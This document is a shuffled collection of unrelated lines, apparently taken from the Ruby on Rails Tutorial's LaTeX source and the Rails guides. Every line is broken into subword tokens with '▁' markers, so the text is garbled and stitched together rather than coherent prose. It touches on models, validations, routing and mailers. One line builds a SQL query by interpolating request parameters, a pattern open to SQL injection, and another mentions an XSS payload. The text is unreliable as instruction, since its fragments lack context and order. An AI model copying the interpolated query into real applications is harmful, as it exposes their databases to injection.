▁In ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }, ▁we ' ll ▁take ▁the ▁( nearly ) ▁p ol ar ▁oppos ite ▁approach : ▁a lthough ▁Chapter ~\ ref { cha : a _ toy _ app } ▁will ▁develop ▁a ▁small ▁toy ▁app ▁using ▁scaffold ing , ▁the ▁ core ▁of ▁the ▁\ emph { Rails ▁Tutorial } ▁is ▁the ▁sample ▁app , ▁which ▁we ' ll ▁start ▁writing ▁in ▁Chapter ~\ ref { cha : static _ pages } .
▁The ▁result ▁is ▁the ▁user ▁\ href { http :// localhost :3000/ users /1 }{\ text tt { show } } ▁page , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : demo _ show _ user _ rails _3} .
▁See ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 4/ classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁We ▁first ▁saw ▁microposts ▁in ▁ l ar val ▁form ▁in ▁Chapter ~\ ref { cha : a _ demo _ app }, ▁and ▁in ▁this ▁chapter ▁we ▁will ▁make ▁a ▁full - strength ▁version ▁of ▁the ▁ sketch ▁from ▁Section ~\ ref { sec : microposts _ resource } ▁by ▁construct ing ▁the ▁Micropost ▁data ▁model , ▁associat ing ▁it ▁with ▁the ▁User ▁model ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods , ▁and ▁then ▁making ▁the ▁forms ▁and ▁partials ▁needed ▁to ▁manipulate ▁and ▁display ▁the ▁results ▁( including , ▁in ▁Section ~\ ref { sec : micropost _ images }, ▁upload ed ▁images ) .
▁### ▁Verify ing ▁B ug ▁Re port s
▁each ▁time ▁un til ▁the ▁tests ▁pass .
▁* ▁development ▁environment :
▁We ▁have ╼[ T ra v is ▁C I ]( https :// t ra v is - ci ▖ org / rails / rails ) ▁as ▁a ▁ safety ▁ net ▁for ▁catch ing ╼ un expect ed ▁break age s ▁else where .
▁You ▁can ▁turn ▁off ▁debug ▁mode ▁by ▁updating ▁` config / environments / development ▖ rb ` ▁to ╼ include :
▁The ▁sample ▁app ▁with ▁nicely ▁style d ▁ logo .
▁#### ▁CSS ▁and ▁ ERB
▁config ▖ middleware ▖ swap ▁ ActionDispatch :: ShowExceptions , ▁ Lifo :: ShowExceptions
▁As ▁we ▁saw ▁brief ly ▁before ▁in ▁the ▁Chapter ~\ ref { cha : a _ toy _ app } ▁ exercises , ▁the ▁way ▁to ▁validate ▁the ▁presence ▁of ▁the ▁name ▁attribute ▁is ▁to ▁use ▁the ▁\ k ode { validates } ▁method ▁with ▁argument ▁\ k ode { presence : ▁true }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ name } .
▁It ' s ▁possible ▁that ▁this ▁will ▁generate ▁a ▁Relationship ▁ factory , ▁which ▁you ▁should ▁remove :
▁< p > Hello , ▁Rails !
▁# ▁=> ▁[
▁As ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : following }, ▁our ▁user ▁interface ▁won ' t ▁allow ▁this ▁to ▁happen , ▁but ▁adding ▁a ▁unique ▁index ▁arrange s ▁to ▁raise ▁an ▁error ▁if ▁a ▁user ▁ tries ▁to ▁create ▁duplicate ▁relationships ▁any way ▁( for ▁example , ▁by ▁using ▁a ▁command - line ▁tool ▁such ▁as ▁\ text tt { curl }) .
▁* ▁You ▁could ▁use ▁an ▁` after _ action ` ▁to ▁do ▁similar ▁setup ▁as ▁a ▁` before _ action ` ▁but ╼ ▁using ▁instance ▁variables ▁set ▁in ▁your ▁mailer ▁action .
▁Testing ▁for ▁the ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes .
▁L uckily , ▁ human s ▁are ▁quite ▁good ▁at ▁making ▁general i z ation s ▁from ▁con c re te ▁examples ; ▁here ▁are ▁a ▁few ▁more , ▁including ▁a ▁couple ▁using ▁the ▁\ k ode { map } ▁method :
▁Change ▁the ▁` belongs _ to ` ▁association ▁inside ▁this ▁model ╼ ( ` app / models / blorgh / article ▖ rb ` ) ▁to ▁this :
▁belongs _ to ▁: section
▁As ▁in ▁Section ~\ ref { sec : the _ hello _ application }, ▁we ' ll ▁start ▁by ▁ generating ▁the ▁application ▁ s k e let on ▁using ▁the ▁\ k ode { rails ▁new } ▁command ▁with ▁a ▁specific ▁Rails ▁version ▁number :
▁If ▁you ▁want ▁to ▁use ▁the ▁new ▁` JSON ` - base d ▁format ╼ in ▁your ▁application , ▁you ▁can ▁add ▁an ▁initializer ▁file ▁with ▁the ▁following ▁content :
▁T ry ▁running
▁We ▁can ▁get ▁the ▁new ▁test ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ test } ▁to ▁pass ▁by ▁adding ▁\ k ode { uniqueness : ▁true } ▁to ▁the ▁\ k ode { email } ▁validation , ▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email } .
▁By ▁default , ▁\ emph { all } ▁model ▁attributes ▁are ▁ accessible .
▁This ▁isn ' t ▁as ▁hard ▁as ▁it ▁ s ound s , ▁because ▁Rails ▁has ▁generated ▁useful ▁example ▁tests ▁for ▁us ▁( Listing ~\ ref { code : generated _ user _ mailer _ test }) .
▁* ▁You ▁may ▁not ▁have ▁write ▁access ▁to ▁your ▁production ▁file ▁system .
▁This ▁action ▁is ▁now ▁display ing ▁the ▁parameters ▁for ▁the ▁article ▁that ▁are ▁ com ing ▁in ╼ from ▁the ▁form ▖
▁<%= ▁f ▖ text _ field ▁: last _ name ▁%>
▁The ▁name ▁is ▁m o t i v at ed ▁by ▁the ▁common ▁ description ▁of ▁Twitter ▁as ▁a ▁\ emph { micro blog } ; ▁since ▁blog s ▁have ▁posts , ▁ micro blog s ▁should ▁have ▁microposts .
▁# ▁Be ▁sure ▁to ▁restart ▁your ▁server ▁when ▁you ▁modify ▁this ▁file .
▁An ▁example ▁of ▁such ▁a ▁table ▁appears ▁in ▁Figure ~\ ref { fig : users _ table }, ▁corresponding ▁to ▁the ▁data ▁model ▁show n ▁in ▁Figure ~\ ref { fig : user _ model _ sketch } .
▁More over , ▁such ▁helpers ▁are ▁automatically ▁included ▁in ▁Rails ▁views ; ▁by ▁including ▁the ▁module ▁into ▁the ▁base ▁class ▁of ▁all ▁controllers ▁( the ▁Application ▁controller ), ▁we ▁arrange ▁to ▁make ▁them ▁available ▁in ▁our ▁controllers ▁as ▁well ▁( Listing ~\ ref { code : sessions _ helper _ include }) .
▁To ▁define ▁a ▁concern :
▁Defaults ▁to ▁` ' encrypted ▁cookie ' ` .
▁Client ▖ where (" orders _ count ▁= ▁# { params [: orders ]} ")
▁### ▁ Adding ▁links
▁<%= ▁f ▖ text _ field ▁: first _ name ▁%>
▁class _ attribute ▁: table _ name _ prefix , ▁instance _ writer : ▁false
▁As ▁a ▁con sequence ▁` false ` ▁can ' t ▁be ▁a ▁used ▁as ▁a ▁p adding ▁value .
▁### ▁S end ing ▁E mail s ▁without ▁ Template ▁Rendering
▁The ╼ ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁less ▁than ▁% { count } " _ .
▁A ▁green ▁( passing ) ▁test ▖ ~\ href { http :// railstutorial ▖ org / images / figures / green _ passing _ spec _4_0 - full ▖ png }{( full ▁size )}
▁| ▁** R ed ir ec tion ** ▁| ▁30 0 ▁| ▁: multiple _ ch o ice s ▁|
▁First , ▁let ' s ▁create ▁a ▁simple ▁` User ` ▁scaffold :
▁This ▁error ▁indicates ▁that ▁Rails ▁cannot ▁find ▁the ▁` new ` ▁action ▁inside ▁the ╼` Article sController ` ▁that ▁you ▁just ▁generated ▖
▁This ▁technique ▁is ▁useful ▁ caching ▁pieces ▁like ▁ menu s , ▁list s ▁of ▁new s ▁topic s , ▁static ▁HTML ▁ fragments , ▁and ▁so ▁on ▖
▁" spec / request s / authentication _ pages _ spec ▖ rb "
▁% Q ( < div ▁class =" field _ with _ errors "> # { html _ tag } </ div > )▖ html _ safe
▁So ▁far ▁we ' ve ▁only ▁reject ed ▁blank ▁email ▁addresses ; ▁in ▁this ▁section , ▁we ' ll ▁require ▁email ▁addresses ▁to ▁con form ▁to ▁the ▁ familiar ▁pattern ▁\ k ode { user @ example ▖ com } .
▁The ▁` form _ for ` ▁call ▁here ▁uses ╼ an ▁array , ▁which ▁will ▁build ▁a ▁nested ▁route , ▁such ▁as ▁` / articles /1/ comments ` .
▁= ============== ================ ================
▁ Most ▁of ▁the ▁ screen sh o t s ▁in ▁this ▁book ▁use ▁ Google ▁C h r o me , ▁but ▁Figure ~\ ref { fig : home _ view _ full _ html } ▁uses ▁ Safari ▁because ▁C h r o me ▁doesn ' t ▁display ▁the ▁full ▁page ▁title .
▁The ▁result ▁of ▁the ▁above ▁discussion ▁is ▁the ▁user / relationship ▁association ▁show n ▁in ▁Listing ~\ ref { code : user _ relationships _ association } ▁and ▁Listing ~\ ref { code : relationship _ belongs _ to } .
▁Note ▁that ▁an ▁object ▁ instantiated ▁with ▁` new ` ▁will ▁not ▁report ▁errors ▁even ▁if ▁it ' s ╼ technical ly ▁invalid , ▁because ▁validations ▁are ▁not ▁run ▁when ▁using ▁` new ` .
▁If ▁you ▁want ▁to ▁see ▁the ▁a verage ▁of ▁a ▁certain ▁number ▁in ▁one ▁of ▁your ▁table s ▁you ▁can ▁call ▁the ▁` a verage ` ▁method ▁on ▁the ▁class ▁that ▁ rel ate s ▁to ▁the ▁table ▖
▁ //= ▁require ▁ home
▁The ▁Home ▁page ▁with ▁a ▁form ▁error .
▁We ▁will ▁thus ▁have ▁to ▁tell ▁Rails ▁the ▁model ▁class ▁name ▁to ▁look ▁for .
▁**` ActionDispatch :: D ebug E xception s ` **
▁The ▁application ▁code , ▁which ▁introduce s ▁the ▁\ k ode { redirect \_ to } ▁method , ▁appears ▁in ▁Listing ~\ ref { code : user _ create _ action } .
▁Then ▁merge ▁the ▁changes ▁back ▁into ▁the ▁master ▁branch ▁using ▁the ▁same ▁technique ▁as ▁in ▁Section ~\ ref { sec : git _ commands }
▁S ince ▁we ▁don ' t ▁want ▁to ▁display ▁debug ▁information ▁to ▁users ▁of ▁a ▁deploy ed ▁application , ▁Listing ~\ ref { code : rails _ debug } ▁uses
▁class ▁C ▁< ▁B ; ▁end
▁E age r ▁loading ▁may ▁trigger ▁more ▁than ▁one ▁query ▁under ▁the ▁h ood , ▁and ▁some ▁queries ╼ ma y ▁need ▁the ▁results ▁of ▁previous ▁one s ▖
▁The ▁easie st ▁solution ▁is ▁to ▁ suppress ▁the ▁feed ▁entire ly ▁by ▁assign ing ▁it ▁an ▁empty ▁array , ▁as ▁show n ▁in ▁Listing ~\ ref { code : microposts _ create _ action _ with _ feed } .
▁We ▁start ▁by ▁defin ing ▁two ▁time ▁inter val s .
▁╼╼\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : sign _ up _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁render ▁action : ▁" edit ▖ html ▖ erb "
▁The ▁methods ▁` beginning _ of _ month ` ▁and ▁` end _ of _ month ` ▁return ▁the ▁date s ▁for ▁the ▁beginning ▁and ▁end ▁of ▁the ▁ month :
▁That ▁is , ▁it ▁works , ▁but ▁it ' s ▁not ▁the ▁Rails ▁way .
▁* ▁` edit _ geocoder _ path ` ▁returns ▁` / geocoder / edit `
▁# ▁▖▖▖ ▖ ▖ .
▁Return s ▁a ▁new ▁Micropost ▁object ▁ associated ▁with ▁\ k ode { user }
▁This ▁will ▁create ▁a ▁Rails ▁application ▁called ▁ Blog ▁in ▁a ▁` blog ` ▁directory ▁and ╼ install ▁the ▁gem ▁ dependencies ▁that ▁are ▁already ▁mentioned ▁in ▁` Gemfile ` ▁using ╼` bundle ▁install ` .
▁=> ▁" test "
▁There ' s ▁a ▁new ▁choice ▁for ▁sanit i z ing ▁HTML ▁ fragments ▁in ▁your ▁applications ▖
▁It ▁works ▁in ▁this ▁case ▁because ▁the ▁Rails ▁console ▁automatically ▁includes ▁the ▁Rails ▁extensions ▁to ▁Ruby .
▁Gravatar ▁is ▁a ▁free ▁ service ▁that ▁allows ▁users ▁to ▁upload ▁images ▁and ▁associate ▁them ▁with ▁email ▁addresses ▁they ▁control .
▁ ╼ ▁end
▁To ▁get ▁code ▁like ▁\ k ode {@ user ▖ microposts ▖ build } ▁to ▁work , ▁we ▁need ▁to ▁update ▁the ▁User ▁and ▁Micropost ▁models ▁with ▁code ▁to ▁associate ▁them .
▁following - users
▁use ▁ ActionDispatch :: D ebug E xception s
▁By ▁the ▁end ▁of ▁it , ▁though , ▁we ▁will ▁have ▁created ▁an ▁in d us t ri al - strength ▁system ▁for ▁valid ating , ▁storing , ▁and ▁re t ri e v ing ▁user ▁information .
▁This ▁is ▁in ▁contrast ▁to ▁the ▁popular ▁open - source ▁version ▁control ▁system ▁called ▁S ub version , ▁in ▁which ▁a ▁commit ▁necessar ily ▁make s ▁changes ▁on ▁a ▁remote ▁repository .
▁The ▁micropost ▁index ▁page ▁(\ href { http ://0▖0▖0▖0:3000/ microposts }{/ microposts }) .
▁This ▁is ▁the ▁first ▁time ▁we ' ve ▁seen ▁the ▁command ▁to ▁create ▁a ▁test ▁database ▁with ▁the ▁correct ▁structure :
▁# ▁=> ▁ { name : [" can ' t ▁be ▁blank "] }
▁See ▁the ▁[ configuration ▁section ▁in ▁the ▁Action ▁Mailer ▁guide ]( http :// guides ▖ rubyonrails ▖ org / action _ mailer _ basic s ▖ html # action - mailer - configuration ) ▁for ▁more ▁ info .
▁* ▁` config ▖ log _ tags ` ▁accept s ▁a ▁list ▁of ▁methods ▁that ▁the ▁` request ` ▁object ▁respond s ▁to ▖
▁S ince ▁a ▁micropost ▁creation ▁form ▁only ▁make s ▁sense ▁in ▁the ▁context ▁of ▁a ▁particular ▁signed - in ▁user , ▁one ▁goal ▁of ▁this ▁section ▁will ▁be ▁to ▁serve ▁different ▁versions ▁of ▁the ▁Home ▁page ▁depending ▁on ▁a ▁visit or ' s ▁signin ▁status .
▁Defaults ▁to ▁` - i ▁- t ` ▖ </ li ></ ul > |
▁#### ▁` singularize `
▁S ince ▁it ▁is ▁possible ▁to ▁e mb ed ▁ ERB ▁in ▁your ▁` config / database ▖ yml ` ▁it ▁is ▁best ▁practice ▁to ▁explicitly ▁show ▁you ▁are ▁using ▁the ▁` ENV [' DAT A BASE _ URL ']` ▁to ▁ connect ▁to ▁your ▁database ▖
▁So ▁the ▁pa y load ▁is ▁in ▁the ▁style ▁attribute ▖
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / range / overlap s ▖ rb ` .
▁has _ one ▁: account , ▁-> ▁ { ▁where ▁" confirmed ▁= ▁1 " ▁ }
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁ proto - feed ▖ ~\ href { http :// railstutorial ▖ org / images / figures / proto _ feed _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁ super
▁By ▁compar ing ▁ hashed ▁values ▁instead ▁of ▁raw ▁passwords , ▁we ▁will ▁be ▁able ▁to ▁ authenticate ▁users ▁without ▁storing ▁the ▁passwords ▁themselves .
▁With ▁that , ▁our ▁layout ▁has ▁links ▁to ▁all ▁the ▁static ▁pages ▁created ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁so ▁that , ▁for ▁example , ▁\ href { http :// localhost :3000/ about }{/ about } ▁go es ▁to ▁the ▁About ▁page ▁( Figure ~\ ref { fig : about _ page }) .
▁Also ▁note ▁that ▁the ▁line
▁I 18 n ▖ locale ▁= ▁: de
▁You ▁can ▁also ▁specify ▁constraints ▁as ▁a ▁ lambda :
▁In ▁other ▁words , ▁\ emph { all } ▁our ▁pages ▁are ▁identical ▁in ▁structure , ▁including ▁the ▁contents ▁of ▁the ▁title ▁tag , ▁with ▁the ▁so le ▁exception ▁of ▁the ▁material ▁inside ▁the ▁\ k ode { body } ▁tag .
▁* ▁`: re strict _ with _ error ` ▁cause s ▁an ▁error ▁to ▁be ▁added ▁to ▁the ▁ owner ▁if ▁there ▁are ▁any ▁ associated ▁objects
▁Also ▁note ▁the ▁use ▁of ▁the ▁\ k ode { remember \_ digest } ▁attribute , ▁which ▁is ▁the ▁same ▁as ▁\ k ode { self ▖ remember \_ digest } ▁and , ▁like ▁\ k ode { name } ▁and ▁\ k ode { email } ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁is ▁created ▁automatically ▁by ▁Active ▁Record ▁base d ▁on ▁the ▁name ▁of ▁the ▁corresponding ▁database ▁column ▁( Listing ~\ ref { code : add _ remember _ digest _ to _ users _ generated }) .
▁self ▖ primary _ key ▁= ▁" product _ id "
▁README ▖ rdoc ▁| ▁24 3 ▁-- ---------------- ---------------- ----------------
▁In ▁this ▁particular ▁case , ▁you ▁should ▁first ▁try ▁stop p ing ▁the ▁process es ▁with ▁the ▁\ text tt { spring } ▁command ▁itself :
▁U nfortunately , ▁there ' s ▁one ▁more ▁change ▁we ▁need ▁to ▁make ▁to ▁be ▁as sure d ▁of ▁email ▁uniqueness , ▁which ▁is ▁to ▁make ▁sure ▁that ▁the ▁email ▁address ▁is ▁all ▁lower - case ▁before ▁it ▁get s ▁saved ▁to ▁the ▁database .
▁# ▁ Sign ▁the ▁user ▁in ▁and ▁redirect ▁to ▁the ▁user ' s ▁show ▁page .
▁ Asset s ▁can ▁ still ▁be ▁placed ▁in ▁the ▁` public ` ▁hierarchy ▖
▁f ur n is h ed ▁to ▁do ▁so , ▁subject ▁to ▁the ▁following ▁conditions :
▁This ▁practice ▁couple s ▁the ▁test ▁t ight ly ▁to ▁the ▁implementation , ▁and ▁we ▁would ▁have ▁to ▁change ▁it ▁every where ▁if ▁the ▁implementation ▁changed .
▁Note ▁that ▁when ▁using ▁partial ▁write s , ▁you ▁should ▁also ▁use ▁ optimistic ▁ lock ing ▁` config ▖ active _ record ▖ lock _ optimistic ally ` ▁since ▁con current ▁update s ▁may ▁write ▁attributes ▁base d ▁on ▁a ▁ possibl y ▁ st a le ▁read ▁state ▖
▁They ▁just ▁won ' t ▁get ▁back port ed ▁to ▁ maintenance ▁branch es .
▁I ▁shall ▁be ▁late !" ▖ truncate ( 18 , ▁ separator : ▁' ▁ ')
▁ ▖ ▖ .
▁ Not ▁very ▁ DRY , ▁e h ?
▁as ▁show n ▁in ▁Listing ~\ ref { code : basic _ signup _ tests } .
▁To ▁test ▁the ▁engine ,╼ the re ▁is ▁a ▁ cut - d own ▁version ▁of ▁a ▁Rails ▁application ▁ embedded ▁within ▁it ▁at ╼` test / dummy ` ▖
▁Of ▁course ▁this ▁URL ▁does ▁not ▁exist , ▁so ▁the ▁browser ▁display s ▁not h ing ▖
▁But ▁web ▁developers ' ▁understanding ▁of ▁how ▁best ▁to ▁ authenticate ▁users ▁has ▁m at ur ed ▁enough ▁that ▁it ▁now ▁comes ▁bundle d ▁with ▁the ▁latest ▁version ▁of ▁Rails .
▁We ' ll ▁learn ▁more ▁about ▁HTTP ▁request ▁methods ▁starting ▁in ▁Section ~\ ref { sec : TDD } .
▁In ▁previous ▁versions ▁when ▁you ▁defined ▁a ▁` default _ scope ` ▁in ▁a ▁model ╼ it ▁was ▁overrid d en ▁by ▁ chain ed ▁conditions ▁in ▁the ▁same ▁field ▖
▁Because ▁of ▁the ▁\ k ode { navbar - fixed \ - to p } ▁class ▁in ▁the ▁\ k ode { header } ▁tag , ▁Bootstrap ▁fix es ▁the ▁navigation ▁bar ▁to ▁the ▁to p ▁of ▁the ▁page , ▁so ▁the ▁p adding ▁serve s ▁to ▁separate ▁the ▁main ▁text ▁from ▁the ▁navigation .
▁Route s ▁provided ▁by ▁the ▁sessions ▁rules ▁in ▁Listing ~\ ref { code : sessions _ resource } .
▁$ ▁A R C ON N = sqlite 3 ▁ ruby ▁- I test ▁test / case s / associations / has _ many _ associations _ test ▖ rb
▁I ' ve ▁he ar d ▁es pecially ▁good ▁things ▁about ▁Ruby M in e , ▁and ▁one ▁reader ▁( David ▁L o e f f ler ) ▁has ▁assembl ed ▁\ href { https :// github ▖ com / perfect ion ist / sample _ project / wiki } { note s ▁on ▁how ▁to ▁use ▁Ruby M in e ▁with ▁this ▁tutorial }
▁#### ▁CSS ▁and ▁Sass
▁# ▁In ▁B ar ce lo na , ▁2010 / 0 3 / 28 ▁ 02 :00 ▁+ 0 1 00 ▁becomes ▁2010 / 0 3 / 28 ▁0 3 :00 ▁+0200 ▁due ▁to ▁D ST .
▁The ▁view ▁in ▁Listing ~\ ref { code : will _ paginate _ index _ view } ▁doesn ' t ▁work ▁yet , ▁though , ▁because ▁current ly ▁\ k ode {@ users } ▁contains ▁the ▁results ▁of ▁\ k ode { User ▖ all } ▁( Listing ~\ ref { code : user _ index }), ▁whereas ▁\ k ode { will \_ paginate } ▁requires ▁that ▁we ▁ paginate ▁the ▁results ▁explicitly ▁using ▁the ▁\ k ode { paginate } ▁method :
▁ Follow ing ▁the ▁scaffold ing ▁approach ▁risk s ▁turn ing ▁you ▁into ▁a ▁ v ir t u o so ▁ script ▁generator ▁with ▁little ▁( and ▁brittle ) ▁actual ▁ knowledg e ▁of ▁Rails .
▁else
▁For ▁example :
▁The ▁\ k ode { belongs \_ to } ▁relationship ▁between ▁a ▁micropost ▁and ▁its ▁ associated ▁user .
▁as ▁show n ▁in ▁Listing ~\ ref { code : unicorn _ gemfile } .
▁< head >
▁< span ▁class =' exercise ' ▁id =' ex - b 6 b 1 14 ' ></ span >╼ \ end { enumerate } ╼╼% ▁subsection ▁generated _ static _ pages ▁( end )╼╼ \ subsection { Custom ▁static ▁pages } ▁% ▁( fold )╼\ label { sec : custom _ static _ pages }╼╼
▁This ▁tutorial ▁ assumes ▁that ▁most ▁readers ▁are ▁using ▁Ruby ~ 1▖9▖3 ▁or ▁ 2▖0▖ 0, ▁but ▁Ruby ▁1▖9 ▖ 2 ▁should ▁work ▁as ▁well .
▁You ▁may ▁use ▁the ▁`: root ` ▁option ▁to ▁ensure ▁a ▁consistent ▁root ▁element .
▁What ▁if ▁you ▁need ▁to ▁follow ▁a ▁different ▁naming ▁convention ▁or ▁need ▁to ▁use ▁your ╼ Rails ▁application ▁with ▁a ▁ legacy ▁database ?
▁\ emph { Note } : ▁If ▁you ▁would ▁like ▁to ▁install ▁\ emph { all } ▁the ▁gems ▁needed ▁for ▁the ▁sample ▁application , ▁you ▁should ▁use ▁the ▁code ▁in ▁Listing ~\ ref { code : final _ gemfile } ▁at ▁this ▁time .
▁A ▁Rake ▁task ▁for ▁ seed ing ▁the ▁database ▁with ▁sample ▁users .
▁* ▁In clu de ▁tests ▁that ▁fail ▁without ▁your ▁code , ▁and ▁pass ▁with ▁it .
▁We ▁brief ly ▁ en counter ed ▁a ▁similar ▁issue ▁in ▁Section ~\ ref { sec : updating _ and _ deleting _ users _ co nclusion } ▁in ▁the ▁context ▁of ▁the ▁users ▁index .
▁In ▁Chapter ~\ ref { cha : a _ demo _ app }, ▁we ' ll ▁make ▁a ▁second ▁project , ▁who se ▁purpose ▁is ▁to ▁demonstrate ▁the ▁basic ▁working s ▁of ▁a ▁Rails ▁application .
▁E ve ry ▁association ▁will ▁attempt ▁to ▁automatically ▁find ▁the ▁ inverse ▁association ╼ and ▁set ▁the ▁`: inverse _ of ` ▁option ▁he ur ist ical ly ▁( base d ▁on ▁the ▁association ▁name ) .
▁Before ▁ submitting ▁a ▁valid ▁ registration ▁in ▁a ▁browser , ▁we ' re ▁going ▁to ▁add ▁a ▁bit ▁of ▁polish ▁common ▁in ▁web ▁applications : ▁a ▁message ▁that ▁appears ▁on ▁the ▁subsequent ▁page ▁( in ▁this ▁case , ▁we l com ing ▁our ▁new ▁user ▁to ▁the ▁application ) ▁and ▁then ▁disappear s ▁upon ▁visit ing ▁a ▁second ▁page ▁or ▁on ▁page ▁ reload .
▁Such ╼ is ▁the ▁open ▁source ▁ life .
▁ ╼ / log /* ▖ log ╼ / t mp ╼╼ # ▁I gnore ▁ Spring ▁files .
▁( In ▁fact , ▁we ' ve ▁already ▁used ▁\ k ode { alert - danger } ▁once , ▁to ▁style ▁the ▁error ▁message ▁ div ▁in ▁Listing ~\ ref { code : errors _ partial } ▖)
▁De tail ed ▁examples ▁of ▁the ▁common ▁database ▁connection s ▁are ▁below .
▁Defin ing ▁a ▁database ▁index ▁improve s ▁look up ▁e f fi ci en c y ▁while ▁allow ing ▁enforce ment ▁of ▁uniqueness ▁at ▁the ▁database ▁level .
▁In ▁Chapter ~\ ref { cha : following _ users }, ▁we ' ll ▁complete ▁our ▁t in y ▁Twitter ▁ clone ▁by ▁adding ▁the ▁not ion ▁of ▁\ emph { following } ▁users ▁in ▁order ▁to ▁receive ▁a ▁\ emph { feed } ▁of ▁their ▁microposts .
▁P lease ▁ignore ▁( or ▁fix ! ) ▁them , ▁if ▁any , ▁and ▁submit ▁ patch es ▁that ▁do ▁not ▁issue ▁new ▁ warning s .
▁We ' ll ▁start ▁by ▁writing ▁tests ▁for ▁the ▁title s , ▁then ▁add ▁the ▁title s ▁themselves , ▁and ▁finally ▁use ▁a ▁\ emph { layout } ▁file ▁to ▁refactor ▁the ▁result ing ▁pages ▁and ▁eliminate ▁duplication .
▁ Adding ▁a ▁ backtrace ▁ silencer ▁for ▁ RVM .
▁( O n ▁some ▁systems , ▁you ▁may ▁have ▁to ▁restart ▁the ▁Rails ▁server ▁at ▁this ▁point ▖)
▁The ▁Users ▁controller ▁in ▁schematic ▁form .
▁| ` delivery _ method ` | D e f in es ▁a ▁ delivery ▁method ▖
▁The ▁initial ▁failed ▁login , ▁with ▁\ k ode { create } ▁as ▁in ▁Listing ~\ ref { code : initial _ create _ session } .
▁<%= ▁stylesheet _ link _ tag ▁" application ", ▁ media : ▁" all ", ▁" data - turbolinks - track " ▁=> ▁true ▁%>
▁On ce ▁we ' ve ▁created ▁objects , ▁we ▁often ▁want ▁to ▁update ▁them .
▁On ▁subsequent ▁signin ▁attempt s , ▁the ▁ forwarding ▁URL ▁should ▁ r ever t ▁to ▁the ▁default ▁( i ▖ e ▖ , ▁the ▁profile ▁page ) .
▁### ▁ Routing ▁to ▁Rack ▁Application s
▁What ▁we ▁want ▁to ▁do ▁is ▁select ▁from ▁the ▁\ k ode { microposts } ▁table ▁all ▁the ▁microposts ▁with ▁id s ▁corresponding ▁to ▁the ▁users ▁being ▁followed ▁by ▁a ▁given ▁user ▁( or ▁the ▁user ▁itself ) .
▁Now , ▁suppose ▁we ▁want ed ▁to ▁add ▁a ▁new ▁order ▁for ▁an ▁existing ▁customer ▖
▁An ▁object ▁like ▁a ▁string , ▁for ▁example , ▁can ▁respond ▁to ▁the ▁message ▁\ k ode { length }, ▁which ▁returns ▁the ▁number ▁of ▁characters ▁in ▁the ▁string :
▁We ' ll ▁opt ▁for ▁the ▁final ▁of ▁these ▁options : ▁when ▁users ▁sign ▁in , ▁we ▁will ▁remember ▁their ▁signin ▁status ▁`` for ever '' , ▁clear ing ▁the ▁session ▁only ▁when ▁the ▁user ▁explicitly ▁sign s ▁out .
▁@ patient ▁= ▁P at i ent ▖ find ( 17 )
▁All ▁ items ▁must ▁respond ▁to ▁` to _ xml `, ▁an ▁exception ▁is ▁raised ▁otherwise .
▁The ▁code ▁in ▁Listing ~\ ref { code : validates _ content _ presence } ▁shows ▁how ▁to ▁add ▁a ▁validation ▁for ▁the ▁presence ▁of ▁micropost ▁content ▁in ▁order ▁to ▁ensure ▁that ▁microposts ▁can ' t ▁be ▁blank .
▁For ▁example , ▁did ▁you ▁know ▁that ▁\ k ode {" Michael ▁Hartl " @ example ▖ com }, ▁with ▁ quot ation ▁mark s ▁and ▁a ▁ space ▁in ▁the ▁m id d le , ▁is ▁a ▁valid ▁email ▁address ▁according ▁to ▁the ▁standard ?
▁Here ▁are ▁the ▁steps ▁for ▁getting ▁started ▁with ▁the ▁cloud ▁development ▁environment :
▁In ▁fact , ▁using ▁Rails ▁even ▁for ▁static ▁pages ▁yields ▁a ▁ distinct ▁advantage : ▁we ▁can ▁easily ▁add ▁just ▁a ▁\ emph { small } ▁amount ▁of ▁dynamic ▁content .
▁</ small >
▁The ▁user ▁profile ▁with ▁microposts ▁(\ href { http ://0▖0▖0▖0:3000/ users /1}{/ users /1 }) .
▁now ▖ utc ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁23:2 7 : 5 2 ▁+0000
▁create _ table ▁: appointment s ▁do ▁| t |
▁Here ▁the ▁sample ▁relationships ▁are ▁created ▁using ▁the ▁code
▁following
▁### ▁` include ?
▁The ▁` find _ by ` ▁method ▁find s ▁the ▁first ▁record ▁matching ▁some ▁conditions ▖
▁M at ch ing ▁HTML
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁User ▁and ▁Micropost ▁models .
▁By ▁default ▁Rails ▁ ship s ▁with ▁three ▁ environments : ▁" development ", ▁" test ", ▁and ▁" production "▖
▁The ▁` last ` ▁method ▁find s ▁the ▁last ▁record ▁order ed ▁by ▁the ▁primary ▁key ▖
▁The ▁key ▁is ▁to ▁check ▁all ▁three ▁requirements ▁for ▁the ▁feed : ▁microposts ▁for ▁both ▁followed ▁users ▁and ▁the ▁user ▁itself ▁should ▁be ▁included ▁in ▁the ▁feed , ▁but ▁a ▁post ▁from ▁an ▁\ emph { unfollow ed } ▁user ▁should ▁not ▁be ▁included .
▁date ▁= ▁Date ▖ new (201 0, ▁6 , ▁6 )
▁This ▁command ▁does ▁such ▁and ▁such .
▁### ▁` errors `
▁The ▁a wesome ▁\ href { http :// www ▖ rubular ▖ com /}{ Rubular } ▁regular ▁expression ▁editor .
